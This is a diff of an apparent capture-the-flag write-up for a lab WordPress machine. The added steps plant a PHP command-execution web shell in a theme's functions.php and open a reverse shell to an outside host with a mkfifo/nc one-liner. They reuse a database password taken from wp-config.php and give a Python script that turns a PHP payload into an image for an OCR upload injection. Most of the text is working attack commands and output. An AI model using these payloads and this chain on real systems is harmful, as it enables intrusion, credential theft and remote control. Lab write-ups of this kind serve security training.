@@ -337,5 +337,134 @@ Serving HTTP on 0.0.0.0 port 2222 (http://0.0.0.0:2222/) ...
 
 &#x20;<mark style="color:blue;">**Step 5**</mark>
 
-**Now let's take reverse shell  the most probably on WP we take it from a plugins or something like that let's search on dahsboard what plugins are isntalled and if they're are vulnerable**&#x20;
+**Now let's take reverse shell  the most probably on WP we take it from a plugins,themes or something like that let's search on dahsboard what plugins are isntalled and if they're are vulnerable**&#x20;
 
+**The active themes is webagency,we update the funtions.php template**
+
+{% code overflow="wrap" %}
+```
+if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-07-07 143739.png" alt=""><figcaption></figcaption></figure>
+
+**we save it then we visit the URL**
+
+[https://makesense.htb/wp-content/themes/webagency/functions.php?cmd=id](https://makesense.htb/wp-content/themes/webagency/functions.php?cmd=id)
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+**Now we take a rev shell**
+
+{% code overflow="wrap" %}
+```bash
+curl 'https://makesense.htb/wp-content/themes/webagency/functions.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.45%209001%20%3E%2Ftmp%2Ff' \
+    -b 'wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_666f3cbf9610031df176da93aa83bc38=hacker%7C1783602356%7CGidfE0PiHseeTkHE6ndVtEGwaMjAiML730TVlAMixG4%7C88be019c1bc5ce1eae9f0df21bd2bf1a385e6840380c737fb6cdb5
+89c7cb8440; wp_lang=en_US; wp-settings-time-6=1783431474' --insecure
+
+
+listener 9001
+www-data@makesense:/var/www/html/wp-content/themes/webagency$
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+```
+{% endcode %}
+
+<mark style="color:blue;">**Step 6**</mark>
+
+**Let's pivot to walter**
+
+{% code overflow="wrap" %}
+```bash
+cat wp-config.php
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'walter' );
+define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
+define( 'DB_HOST', 'localhost' );
+define( 'DB_CHARSET', 'utf8' );
+define( 'DB_COLLATE', '' );
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+su - walter
+walter@makesense:~$
+```
+{% endcode %}
+
+<mark style="color:blue;">**Step 7**</mark>
+
+**let's elevate our privs**
+
+{% code overflow="wrap" %}
+```bash
+ps aux | grep "root"
+root        1375  0.0  0.0   2800  1816 ?        Ss   10:59   0:00 /bin/sh -c /root/.scripts/start_ocr4.sh
+root        1376  0.0  0.0   7340  3588 ?        S    10:59   0:07 /bin/bash /root/.scripts/start_ocr4.sh
+root        1400  0.0  0.7 228488 30536 ?        S    10:59   0:01 php -S 127.0.0.1:8001 -t /root/ocr4/
+```
+{% endcode %}
+
+**First thing lets forward to this port**&#x20;
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**Logging using walter creds**
+
+**After disconvering the site we draw a canvas then it reconized then saved on burp we have two rewqeust one for canvas to dataURL it give our draw in format then we receive a hidden OCR\_id on the response with this OCR\_id we dave an image on /saved/sohaib.txt**
+
+**the problem the sanitization input we can save a php file and we can write a pyalod in image/png format with converting to Data URL and save it using the OCR\_ID**
+
+**i use this script that convert my payload**
+
+{% code overflow="wrap" %}
+```py
+from PIL import Image, ImageDraw, ImageFont
+import base64
+import urllib.parse
+
+# Payload plus simple pour Tesseract
+payload = "<?php system('id'); ?>"
+
+# Image plus grande avec plus de contraste
+img = Image.new('RGB', (1000, 300), color='white')
+d = ImageDraw.Draw(img)
+
+# Utiliser une grande police monospace
+try:
+    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 40)
+except:
+    try:
+        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 40)
+    except:
+        font = ImageFont.load_default()
+
+# Dessiner le texte avec plus d'espace
+d.text((50, 100), payload, fill='black', font=font)
+img.save('/tmp/payload_clean.png')
+
+# Convertir en base64
+with open('/tmp/payload_clean.png', 'rb') as f:
+    b64 = base64.b64encode(f.read()).decode()
+
+# Créer le data URL
+data_url = f"data:image/png;base64,{b64}"
+
+# URL encoder
+encoded = urllib.parse.quote(data_url)
+
+print(encoded)
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
